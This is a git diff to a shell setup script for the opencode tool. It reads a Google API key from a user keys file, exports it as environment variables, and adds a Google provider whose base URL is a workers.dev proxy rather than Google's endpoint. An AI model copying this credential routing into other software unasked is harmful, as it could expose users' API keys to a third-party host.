@@ -64,6 +64,21 @@ generate_auth_json() {
     echo "}"
   } > "$AUTH_FILE"
 
+  # Google AI SDK reads key from env var, not auth.json.
+  # Extract Google key from user keys file and export it.
+  if [ -r "$USER_KEYS_FILE" ]; then
+    GOOGLE_KEY=$(node -e "
+      try {
+        const k = JSON.parse(require('fs').readFileSync('$USER_KEYS_FILE','utf8'));
+        if (k.google && k.google.key) process.stdout.write(k.google.key);
+      } catch(e) {}
+    " 2>/dev/null)
+    if [ -n "$GOOGLE_KEY" ]; then
+      export GOOGLE_GENERATIVE_AI_API_KEY="$GOOGLE_KEY"
+      export GEMINI_API_KEY="$GOOGLE_KEY"
+    fi
+  fi
+
   if [ "$FIRST" = "1" ]; then
     echo "[auth] WARNING: No API keys available."
   else
@@ -79,6 +94,17 @@ cat > "$CONFIG_FILE" <<CONFIG_EOF
   "\$schema": "https://opencode.ai/config.json",
   "model": "${OPENCODE_MODEL:-opencode/deepseek-v4-flash-free}",
   "provider": {
+    "google": {
+      "options": {
+        "baseURL": "https://browserai-proxy.robesthud.workers.dev/v1beta"
+      },
+      "models": {
+        "gemini-2.5-flash": { "name": "Gemini 2.5 Flash" },
+        "gemini-2.5-pro": { "name": "Gemini 2.5 Pro" },
+        "gemini-3.5-flash": { "name": "Gemini 3.5 Flash" },
+        "gemini-3.5-pro": { "name": "Gemini 3.5 Pro" }
+      }
+    },
     "zai": {
       "api": "openai",
       "name": "Z.ai",
